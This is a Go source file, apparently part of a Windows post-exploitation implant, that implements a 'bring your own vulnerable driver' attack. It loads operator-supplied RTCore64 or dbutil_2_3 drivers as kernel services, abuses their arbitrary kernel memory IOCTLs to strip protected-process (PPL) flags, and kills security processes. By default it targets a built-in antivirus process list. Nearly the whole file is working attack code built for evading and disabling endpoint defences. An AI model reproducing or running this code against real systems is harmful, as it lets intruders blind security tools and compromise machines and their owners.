//go:build windows && !light

package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── BYOVD 驱动加载 + PPL 击杀（内核级，实验性）──────────────────────────
//
// byovd_load：把操作员提供的（已签名但易受攻击的）驱动 .sys 写入系统驱动目录，
//   通过 SCM 创建并启动内核服务，返回设备路径（如 \\.\RTCore64）。
//   写入前会先尽力停止同名旧服务并删除旧文件（防止文件被占用）。
// byovd_unload：停止并删除服务、删除驱动文件。
// ppl_kill：先直接 TerminateProcess；对 PPL/自保护进程（拒绝访问）尝试
//   内核级清除 EPROCESS.Protection 后重试，按可用驱动自动选择路线：
//     1) RTCore64（默认）— 任意内核虚拟地址读写（逆向自原厂驱动）：
//        a) NtQuerySystemInformation 取目标进程 EPROCESS 虚拟地址；
//        b) IOCTL 0x80002068/0x8000206C 直接读改写 Protection（48 字节
//           METHOD_BUFFERED 结构，1/2/4 字节访问），无物理扫描、无蓝屏风险；
//        c) 仅当 Protection 字节非零（确为 PPL）才清零，非 PPL 不写。
//     2) dbutil_2_3 风格 — "任意虚拟地址写"路线（需自行上传驱动，已被
//        黑名单/杀软重点标记）：直接写 EPROCESS VA（无校验，备用）。
//   EPROCESS.Protection 偏移按 Windows build 号自动选择（RtlGetVersion；
//   Win11 24H2+/26100 起结构大改，Protection=0x5FA）。
//
// ⚠️ 实验性：偏移数据来自公开研究，需实机验证；驱动为操作员提供或内置
//    （RTCore64.sys 为原厂 MSI 签名二进制，SHA-256 已核对）。

const (
	// 内核级 PPL 清除路线（按已加载驱动自动选择）
	rtDevice = `\\.\RTCore64`
	// RTCore64 IOCTL（逆向自原厂驱动：IoControlCode+0x7FFFE000 查跳转表）
	rtIoctlReadMem  = 0x80002068 // 读 1/2/4 字节（内核虚拟地址，METHOD_BUFFERED 48B）
	rtIoctlWriteMem = 0x8000206C // 写 1/2/4 字节
	rtIoctlReadMsr  = 0x80002050 // 读 MSR（自检用）
	// dbutil_2_3.sys 设备与"任意虚拟地址写"IOCTL（备用路线，需手动上传驱动）
	defaultPPLDevice  = `\\.\DBUtil_2_3`
	defaultWriteIOCTL = 0x9C40A4E4
)

// windowsVersion 通过 RtlGetVersion 读取版本（绕过 GetVersionEx 兼容层）。
func windowsVersion() (major, minor, build uint32) {
	proc := resolveAPI("ntdll.dll", "RtlGetVersion")
	type osVersionInfoExW struct {
		size             uint32
		major            uint32
		minor            uint32
		build            uint32
		platformID       uint32
		csdVersion       [128]uint16
		servicePackMajor uint16
		servicePackMinor uint16
		suiteMask        uint16
		productType      uint8
		reserved         uint8
	}
	v := osVersionInfoExW{size: uint32(unsafe.Sizeof(osVersionInfoExW{}))}
	st, _, _ := proc.Call(uintptr(unsafe.Pointer(&v)))
	if st != 0 {
		return 0, 0, 0
	}
	return v.major, v.minor, v.build
}

// selectProtectionOffset 按 Windows build 号选择 EPROCESS.Protection 偏移（x64）。
// Win11 24H2+（26100）起 EPROCESS 结构大改：SignatureLevel=0x5F8 → Protection=0x5FA
// （数据来源：公开逆向记录，需实机验证）。
func selectProtectionOffset() uint64 {
	_, _, build := windowsVersion()
	switch {
	case build >= 26100:
		return 0x5FA
	case build >= 19041:
		return 0x87A
	case build >= 18362:
		return 0x5E6
	default:
		return 0x5C8
	}
}

func handleBYOVDLoad(taskData string) (string, int32, string) {
	var req struct {
		DriverB64   string `json:"driver_b64"`
		ServiceName string `json:"service_name"`
		DeviceName  string `json:"device_name"`
	}
	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
		return "", -1, fmt.Sprintf("parse byovd data failed: %v", err)
	}
	if req.DriverB64 == "" {
		return "", -1, "missing driver_b64（请上传 .sys 驱动文件）"
	}
	svc := req.ServiceName
	if svc == "" {
		svc = "tsdrv"
	}
	driver, err := base64Decode(req.DriverB64)
	if err != nil {
		return "", -1, fmt.Sprintf("driver base64 decode failed: %v", err)
	}

	// 设备路径：已知驱动直接给标准名；否则按服务名猜测
	dev := `\\.\` + svc
	if req.DeviceName != "" {
		dev = `\\.\` + req.DeviceName
	}
	drvPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys")

	// 已加载则直接复用：避免重复写被内核映射锁定的 .sys（会报"文件被占用"）
	if deviceExists(dev) {
		return fmt.Sprintf("driver already loaded: service=%s, device=%s（无需重复加载）", svc, dev), 0, ""
	}

	// 尽力停止同名旧服务并删除旧文件（重试数次，应对杀软瞬时锁定）
	_ = stopKernelService(svc)
	for i := 0; i < 4; i++ {
		if err := os.Remove(drvPath); err == nil {
			break
		}
		time.Sleep(400 * time.Millisecond)
	}

	// 写入（重试几次，杀软可能瞬时占用）
	var werr error
	for i := 0; i < 4; i++ {
		werr = os.WriteFile(drvPath, driver, 0o644)
		if werr == nil {
			break
		}
		time.Sleep(400 * time.Millisecond)
	}
	if werr != nil {
		return "", -1, fmt.Sprintf("write driver failed: %v（文件被占用：旧驱动仍在运行？杀软自保护拦截？）", werr)
	}

	// SCM 创建 + 启动内核服务
	if err := startKernelService(svc, `\SystemRoot\System32\drivers\`+svc+".sys"); err != nil {
		_ = os.Remove(drvPath)
		return "", -1, fmt.Sprintf("start service failed: %v", err)
	}

	note := ""
	if !deviceExists(dev) {
		note = "（⚠️ 设备未检测到：驱动可能未真正运行、被 HVCI/杀软拦截或设备名不同）"
	}
	return fmt.Sprintf("driver loaded: service=%s, device=%s, path=%s %s", svc, dev, drvPath, note), 0, ""
}

func handleBYOVDUnload(taskData string) (string, int32, string) {
	var req struct {
		ServiceName string `json:"service_name"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)
	svc := req.ServiceName
	if svc == "" {
		svc = "tsdrv"
	}
	if err := stopKernelService(svc); err != nil {
		return "", -1, fmt.Sprintf("stop service failed: %v", err)
	}
	_ = os.Remove(filepath.Join(os.Getenv("SystemRoot"), "System32", "drivers", svc+".sys"))
	return "driver unloaded: " + svc, 0, ""
}

func handlePPLKill(taskData string) (string, int32, string) {
	var req struct {
		Processes []string `json:"processes"`
		PIDs      []uint32 `json:"pids"`
	}
	_ = json.Unmarshal([]byte(taskData), &req)
	names := req.Processes
	if len(names) == 0 && len(req.PIDs) == 0 {
		names = defaultAVProcesses
	}

	protOff := selectProtectionOffset()
	rtReady := deviceExists(rtDevice)
	dbuReady := deviceExists(defaultPPLDevice)

	var b strings.Builder
	b.WriteString("== PPL Kill ==\n")
	major, minor, build := windowsVersion()
	b.WriteString(fmt.Sprintf("[*] Windows %d.%d.%d, EPROCESS.Protection offset=0x%x\n", major, minor, build, protOff))
	switch {
	case rtReady:
		b.WriteString("[*] 内核路线: RTCore64 任意内核虚拟地址读写（IOCTL 0x80002068/0x8000206C，EPROCESS VA 直改）\n")
		// 驱动自检：读 IA32_KERNEL_GS_BASE MSR，非零即驱动原语可用
		if h, err := openRTDevice(); err == nil {
			if v, ok := rtReadMsr(h, 0xC0000102); ok && v != 0 {
				b.WriteString(fmt.Sprintf("[*] 驱动自检 OK: MSR[KERNEL_GS_BASE]=0x%x\n", v))
			} else {
				b.WriteString("[!] 驱动自检失败: MSR 读取未返回（IOCTL 可能被拦截/驱动版本不符）\n")
			}
			resolveAPI("kernel32.dll", "CloseHandle").Call(h)
		}
	case dbuReady:
		b.WriteString("[*] 内核路线: DBUtil_2_3 任意虚拟地址写（备用，无校验）\n")
	default:
		b.WriteString("[!] 未检测到可用驱动（RTCore64/dbutil_2_3），PPL 清除不可用\n")
	}

	// 收集目标：(进程名, pid)。names 走 Toolhelp32 快照；pids 直接反查进程名。
	type target struct {
		name string
		pid  uint32
	}
	var targets []target
	seen := map[uint32]bool{}
	for _, n := range names {
		for _, pid := range findProcessPIDs(n) {
			if !seen[pid] {
				seen[pid] = true
				targets = append(targets, target{n, pid})
			}
		}
	}
	for _, pid := range req.PIDs {
		if seen[pid] {
			continue
		}
		seen[pid] = true
		targets = append(targets, target{processNameOfPID(pid), pid})
	}
	if len(targets) == 0 {
		return "", 0, "没有找到目标进程（未运行或名称不匹配）"
	}

	for _, t := range targets {
		if err := terminateByPID(t.pid); err == nil {
			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated\n", t.name, t.pid))
			continue
		}
		// 直接终止失败 → 尝试内核级清除 PPL 保护
		switch {
		case rtReady:
			cleared, diag, clearErr := clearPPLProtectionRTCore64(t.pid)
			if clearErr != nil {
				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): PPL清除失败 %v [%s]\n", t.name, t.pid, clearErr, diag))
				continue
			}
			b.WriteString(fmt.Sprintf("[*] %s (pid=%d): %s\n", t.name, t.pid, diag))
			if cleared {
				if err := terminateByPID(t.pid); err == nil {
					b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated after PPL clear\n", t.name, t.pid))
				} else {
					b.WriteString(fmt.Sprintf("[?] %s (pid=%d): PPL已清除但仍无法终止: %v\n", t.name, t.pid, err))
				}
			} else {
				b.WriteString(fmt.Sprintf("[?] %s (pid=%d): 非 PPL 保护，PPL 清除未执行，直接终止仍被拦截\n", t.name, t.pid))
			}
		case dbuReady:
			if err := clearPPLProtectionVA(t.pid); err != nil {
				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): PPL清除失败 %v\n", t.name, t.pid, err))
				continue
			}
			if err := terminateByPID(t.pid); err == nil {
				b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated after PPL clear\n", t.name, t.pid))
			} else {
				b.WriteString(fmt.Sprintf("[?] %s (pid=%d): PPL已清除但仍无法终止: %v\n", t.name, t.pid, err))
			}
		default:
			// 无驱动备选：NtDuplicateObject 从 SYSTEM 窃取目标进程句柄后终止
			if err := killPPLNoDriver(t.pid); err == nil {
				b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated via handle duplication\n", t.name, t.pid))
			} else {
				b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 无可用驱动且句柄窃取失败（请先 byovd_load 加载 RTCore64/dbutil_2_3）: %v\n", t.name, t.pid, err))
			}
		}
	}
	return b.String(), 0, ""
}

// ─── SCM 驱动服务 ────────────────────────────────────────────────

func startKernelService(name, binPath string) error {
	procOpenSCManagerW := resolveAPI("advapi32.dll", "OpenSCManagerW")
	procCreateServiceW := resolveAPI("advapi32.dll", "CreateServiceW")
	procOpenServiceW := resolveAPI("advapi32.dll", "OpenServiceW")
	procStartServiceW := resolveAPI("advapi32.dll", "StartServiceW")
	procCloseServiceHandle := resolveAPI("advapi32.dll", "CloseServiceHandle")

	hSCM, _, _ := procOpenSCManagerW.Call(0, 0, 0xF003F /*SC_MANAGER_ALL_ACCESS*/)
	if hSCM == 0 {
		return errors.New("OpenSCManagerW failed (需要管理员权限)")
	}
	defer procCloseServiceHandle.Call(hSCM)

	sn, _ := windows.UTF16PtrFromString(name)
	bp, _ := windows.UTF16PtrFromString(binPath)
	hSvc, _, _ := procCreateServiceW.Call(
		hSCM, uintptr(unsafe.Pointer(sn)), uintptr(unsafe.Pointer(sn)),
		0xF01FF /*SERVICE_ALL_ACCESS*/, 0x1, /*SERVICE_KERNEL_DRIVER*/
		0x3 /*SERVICE_DEMAND_START*/, 0x1, /*SERVICE_ERROR_NORMAL*/
		uintptr(unsafe.Pointer(bp)), 0, 0, 0, 0, 0)
	if hSvc == 0 {
		// 服务已存在：尝试打开
		hSvc, _, _ = procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
		if hSvc == 0 {
			return errors.New("CreateServiceW/OpenServiceW failed")
		}
	}
	defer procCloseServiceHandle.Call(hSvc)

	r1, _, _ := procStartServiceW.Call(hSvc, 0, 0)
	if r1 == 0 {
		return errors.New("StartServiceW failed（驱动可能被 HVCI/黑名单拦截）")
	}
	return nil
}

func stopKernelService(name string) error {
	procOpenSCManagerW := resolveAPI("advapi32.dll", "OpenSCManagerW")
	procOpenServiceW := resolveAPI("advapi32.dll", "OpenServiceW")
	procControlService := resolveAPI("advapi32.dll", "ControlService")
	procDeleteService := resolveAPI("advapi32.dll", "DeleteService")
	procCloseServiceHandle := resolveAPI("advapi32.dll", "CloseServiceHandle")

	hSCM, _, _ := procOpenSCManagerW.Call(0, 0, 0xF003F)
	if hSCM == 0 {
		return errors.New("OpenSCManagerW failed")
	}
	defer procCloseServiceHandle.Call(hSCM)

	sn, _ := windows.UTF16PtrFromString(name)
	hSvc, _, _ := procOpenServiceW.Call(hSCM, uintptr(unsafe.Pointer(sn)), 0xF01FF)
	if hSvc == 0 {
		return nil // 服务不存在，视为已卸载
	}
	defer procCloseServiceHandle.Call(hSvc)

	var status [48]byte
	procControlService.Call(hSvc, 0x1 /*SERVICE_CONTROL_STOP*/, uintptr(unsafe.Pointer(&status[0])))
	procDeleteService.Call(hSvc)
	return nil
}

// ─── 进程终止 ────────────────────────────────────────────────────

// processEntry32W 对应 PROCESSENTRY32W（x64 布局）。
type processEntry32W struct {
	size            uint32
	usage           uint32
	processID       uint32
	defaultHeapID   uintptr
	moduleID        uint32
	threads         uint32
	parentProcessID uint32
	priClassBase    int32
	flags           uint32
	exeFile         [260]uint16
}

// findProcessPIDs 用 Toolhelp32 快照按镜像名查找 PID。
func findProcessPIDs(name string) []uint32 {
	procCreateToolhelp := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procProcess32FirstW := resolveAPI("kernel32.dll", "Process32FirstW")
	procProcess32NextW := resolveAPI("kernel32.dll", "Process32NextW")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	snap, _, _ := procCreateToolhelp.Call(0x2 /*TH32CS_SNAPPROCESS*/, 0)
	if snap == ^uintptr(0) || snap == 0 {
		return nil
	}
	defer procCloseHandle.Call(snap)

	entry := processEntry32W{}
	entry.size = uint32(unsafe.Sizeof(entry))
	var pids []uint32
	if r1, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry))); r1 != 0 {
		for {
			exe := windows.UTF16ToString(entry.exeFile[:])
			if strings.EqualFold(exe, name) {
				pids = append(pids, entry.processID)
			}
			if r2, _, _ := procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry))); r2 == 0 {
				break
			}
		}
	}
	return pids
}

// processNameOfPID 用 Toolhelp32 快照按 PID 反查进程名（找不到返回空串）。
func processNameOfPID(pid uint32) string {
	procCreateToolhelp := resolveAPI("kernel32.dll", "CreateToolhelp32Snapshot")
	procProcess32FirstW := resolveAPI("kernel32.dll", "Process32FirstW")
	procProcess32NextW := resolveAPI("kernel32.dll", "Process32NextW")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	snap, _, _ := procCreateToolhelp.Call(0x2, 0)
	if snap == ^uintptr(0) || snap == 0 {
		return ""
	}
	defer procCloseHandle.Call(snap)

	entry := processEntry32W{}
	entry.size = uint32(unsafe.Sizeof(entry))
	if r1, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry))); r1 != 0 {
		for {
			if entry.processID == pid {
				return windows.UTF16ToString(entry.exeFile[:])
			}
			if r2, _, _ := procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry))); r2 == 0 {
				break
			}
		}
	}
	return ""
}

func terminateByPID(pid uint32) error {
	procOpenProcess := resolveAPI("kernel32.dll", "OpenProcess")
	procTerminateProcess := resolveAPI("kernel32.dll", "TerminateProcess")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	// PROCESS_TERMINATE(0x1) | PROCESS_QUERY_LIMITED_INFORMATION(0x1000)
	hProc, _, _ := procOpenProcess.Call(0x1001, 0, uintptr(pid))
	if hProc == 0 {
		return errors.New("OpenProcess failed (权限不足或 PPL)")
	}
	defer procCloseHandle.Call(hProc)
	r1, _, _ := procTerminateProcess.Call(hProc, 1)
	if r1 == 0 {
		return errors.New("TerminateProcess failed")
	}
	return nil
}

// ─── PPL 保护清除（内核级，实验性）────────────────────────────────

// deviceExists 检查设备是否存在（用于判断驱动是否已加载）。
func deviceExists(path string) bool {
	proc := resolveAPI("kernel32.dll", "CreateFileW")
	pw, _ := windows.UTF16PtrFromString(path)
	h, _, _ := proc.Call(uintptr(unsafe.Pointer(pw)), 0x80000000, 0x7, 0, 3, 0, 0)
	if h == ^uintptr(0) {
		return false
	}
	resolveAPI("kernel32.dll", "CloseHandle").Call(h)
	return true
}

// getEprocessVA 通过 SystemHandleInformation 获取指定 PID 进程对象的 EPROCESS 内核地址。
func getEprocessVA(pid uint32) (uintptr, error) {
	proc := resolveAPI("ntdll.dll", "NtQuerySystemInformation")
	buf := make([]byte, 0x400000)
	var retLen uint32
	st, _, _ := proc.Call(16 /*SystemHandleInformation*/, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), uintptr(unsafe.Pointer(&retLen)))
	if st != 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation failed: 0x%x", st)
	}
	count := binary.LittleEndian.Uint32(buf[:4])
	// 条目 24 字节（x64）：PID(2)+BackTrace(2)+Type(1)+Attr(1)+Handle(2)+pad(2)+Object(8)+Access(4)
	for i := 0; i < int(count); i++ {
		off := 4 + i*24
		if off+24 > len(buf) {
			break
		}
		ePid := binary.LittleEndian.Uint16(buf[off:])
		objType := buf[off+4]
		obj := binary.LittleEndian.Uint64(buf[off+16:])
		// 进程对象类型索引通常为 7（随版本变化）
		if uint32(ePid) == pid && objType == 7 && obj != 0 {
			return uintptr(obj), nil
		}
	}
	return 0, errors.New("process object not found")
}

// ─── 路线 1：RTCore64 任意内核虚拟地址读写（默认）──────────────────
//
// 原厂 MSI Afterburner RTCore64.sys（本驱动经逆向确认）的 IOCTL 分发：
//   计算 (IoControlCode + 0x7FFFE000) 后查跳转表，即实际可用码为 0x800020xx 家族。
//   任意内存读写为：
//     0x80002068 读 1/2/4 字节 / 0x8000206C 写 1/2/4 字节（METHOD_BUFFERED，
//     48 字节结构体：+0x08=目标内核虚拟地址(QWORD)，+0x14=32位基址加数(置0)，
//     +0x18=长度(1/2/4)，+0x1C=值）。
//   因此无需物理内存扫描：拿 EPROCESS 虚拟地址直接读改写 Protection 即可，
//   无扫描蓝屏风险、无偏移匹配问题。

// openRTDevice 打开 RTCore64 设备。
func openRTDevice() (uintptr, error) {
	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
	pw, _ := windows.UTF16PtrFromString(rtDevice)
	h, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0, 0, 3, 0, 0)
	if h == ^uintptr(0) {
		return 0, errors.New("open " + rtDevice + " failed（驱动未加载或设备名不同）")
	}
	return h, nil
}

// rtMemOp 构造 48 字节 METHOD_BUFFERED 结构并执行 IOCTL。
// ioctl=0x80002068 读（结果写回 in[0x1C]）；0x8000206C 写（in[0x1C] 为写入值）。
func rtMemOp(hDev uintptr, ioctl uint32, va uint64, size uint32, value uint32) (uint32, bool) {
	proc := resolveAPI("kernel32.dll", "DeviceIoControl")
	in := make([]byte, 0x30)
	binary.LittleEndian.PutUint64(in[0x08:], va)
	binary.LittleEndian.PutUint32(in[0x14:], 0) // 32 位基址加数
	binary.LittleEndian.PutUint32(in[0x18:], size)
	binary.LittleEndian.PutUint32(in[0x1C:], value)
	var ret uint32
	r1, _, _ := proc.Call(hDev, uintptr(ioctl), uintptr(unsafe.Pointer(&in[0])), 0x30,
		uintptr(unsafe.Pointer(&in[0])), 0x30, uintptr(unsafe.Pointer(&ret)), 0)
	if r1 == 0 {
		return 0, false
	}
	return binary.LittleEndian.Uint32(in[0x1C:]), true
}

// rtReadMem 读目标内核虚拟地址处 1/2/4 字节。
func rtReadMem(hDev uintptr, va uint64, size uint32) (uint32, bool) {
	return rtMemOp(hDev, rtIoctlReadMem, va, size, 0)
}

// rtWriteMem 写目标内核虚拟地址处 1/2/4 字节。
func rtWriteMem(hDev uintptr, va uint64, size uint32, value uint32) bool {
	_, ok := rtMemOp(hDev, rtIoctlWriteMem, va, size, value)
	return ok
}

// rtReadMsr 读 MSR（IOCTL 0x80002050：入参 12 字节 [MSR,0,0]，出参 [MSR,Hi,Lo]）。
func rtReadMsr(hDev uintptr, msr uint32) (uint64, bool) {
	proc := resolveAPI("kernel32.dll", "DeviceIoControl")
	in := make([]byte, 0xC)
	binary.LittleEndian.PutUint32(in[0:], msr)
	var ret uint32
	r1, _, _ := proc.Call(hDev, rtIoctlReadMsr, uintptr(unsafe.Pointer(&in[0])), 0xC,
		uintptr(unsafe.Pointer(&in[0])), 0xC, uintptr(unsafe.Pointer(&ret)), 0)
	if r1 == 0 {
		return 0, false
	}
	hi := binary.LittleEndian.Uint32(in[4:])
	lo := binary.LittleEndian.Uint32(in[8:])
	return uint64(hi)<<32 | uint64(lo), true
}

// clearPPLProtectionRTCore64 用 RTCore64 的任意内核虚拟地址读写清除
// 目标进程 EPROCESS.Protection（EPROCESS VA 来自 NtQuerySystemInformation）。
// Protection 偏移优先动态探测（沿 ActiveProcessLinks 遍历 + 特征签名，
// 兼容未来 Windows 版本），失败回退硬编码表。
// 仅当 Protection 字节非零（确为 PPL 保护）时才清零，非 PPL 进程跳过写入。
// 返回（是否写入, 诊断信息, 错误）。
func clearPPLProtectionRTCore64(pid uint32) (bool, string, error) {
	hDev, err := openRTDevice()
	if err != nil {
		return false, "", err
	}
	defer resolveAPI("kernel32.dll", "CloseHandle").Call(hDev)

	eprocess, err := getEprocessVA(pid)
	if err != nil {
		return false, "", fmt.Errorf("获取 EPROCESS VA 失败: %v", err)
	}

	// 优先动态探测偏移（不依赖 build 表），失败回退硬编码
	protOff := uint64(selectProtectionOffset())
	dynOff, derr := selectProtectionOffsetDynamic(hDev, pid)
	if derr == nil && dynOff > 0 {
		protOff = dynOff
	}

	// 读 Protection 字节（4 字节对齐读回改写，兼容任意偏移）
	bytePos := uint64(protOff & 3)
	aligned := uint64(eprocess) + protOff - bytePos
	cur, ok := rtReadMem(hDev, aligned, 4)
	if !ok {
		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x(dyn=%v)", eprocess, protOff, derr == nil),
			errors.New("rtReadMem 失败（驱动 IOCTL 被拦截？）")
	}
	protByte := byte((cur >> (bytePos * 8)) & 0xFF)
	if protByte == 0 || protByte == 0xFF {
		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x protection=0x%02x", eprocess, protOff, protByte),
			errors.New("Protection=0（非 PPL 保护，杀软自保护驱动拦截需另辟路线）")
	}
	// 清零该字节后写回
	cur &^= 0xFF << (bytePos * 8)
	if !rtWriteMem(hDev, aligned, 4, cur) {
		return false, fmt.Sprintf("eprocess=0x%x protOff=0x%x", eprocess, protOff),
			errors.New("rtWriteMem 失败")
	}
	return true, fmt.Sprintf("eprocess=0x%x protOff=0x%x(dyn=%v) protection=0x%02x->0x00", eprocess, protOff, derr == nil, protByte), nil
}

// ─── 路线 2：dbutil_2_3 任意虚拟地址写（备用）────────────────────

// clearPPLProtectionVA 用"内核虚拟地址写"型驱动清除 EPROCESS.Protection
// （默认 dbutil_2_3 风格 IOCTL，无校验，风险较高）。
func clearPPLProtectionVA(pid uint32) error {
	eprocess, err := getEprocessVA(pid)
	if err != nil {
		return err
	}
	// 打开设备
	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
	procDeviceIoControl := resolveAPI("kernel32.dll", "DeviceIoControl")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
	pw, _ := windows.UTF16PtrFromString(defaultPPLDevice)
	hDev, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0, 0, 3, 0, 0)
	if hDev == ^uintptr(0) {
		return errors.New("open " + defaultPPLDevice + " failed（驱动未加载或设备名不同）")
	}
	defer procCloseHandle.Call(hDev)

	// 写入 0 到 Protection 偏移（dbutil 结构：dest, src, size）
	target := eprocess + uintptr(selectProtectionOffset())
	zero := byte(0)
	type op struct {
		dest, src, size uintptr
	}
	o := op{dest: target, src: uintptr(unsafe.Pointer(&zero)), size: 1}
	var ret uint32
	r1, _, _ := procDeviceIoControl.Call(hDev, defaultWriteIOCTL, uintptr(unsafe.Pointer(&o)), uintptr(unsafe.Sizeof(o)), 0, 0, uintptr(unsafe.Pointer(&ret)), 0)
	if r1 == 0 {
		return errors.New("DeviceIoControl write failed")
	}
	return nil
}

func base64Decode(s string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(s)
}
